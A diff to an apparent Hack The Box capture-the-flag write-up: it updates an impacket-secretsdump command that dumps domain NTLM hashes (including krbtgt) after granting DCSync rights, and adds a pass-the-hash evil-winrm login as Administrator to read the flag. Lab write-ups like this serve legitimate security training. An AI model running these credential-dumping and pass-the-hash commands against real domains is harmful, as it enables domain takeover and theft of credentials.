@@ -300,7 +300,7 @@ Now, we can give DCSyn rights to my new domain user "farid".
 After all of them, I can easily get the Administrator hash by this command:  
 ```bash
 ┌──(faridd㉿Ferid)-[~/Downloads]
-└─$ impacket-secretsdump htb.local/john:'abc123!'@10.129.6.124 
+└─$ impacket-secretsdump htb.local/john:'abc123!'@10.129.25.123 
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -310,7 +310,11 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
 ```
-
+Just access as Administrator and read the flag:  
+```bash
+evil-winrm -i 10.129.25.123 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+type C:\Users\Administrator\Desktop\root.txt
+```
 
 
 
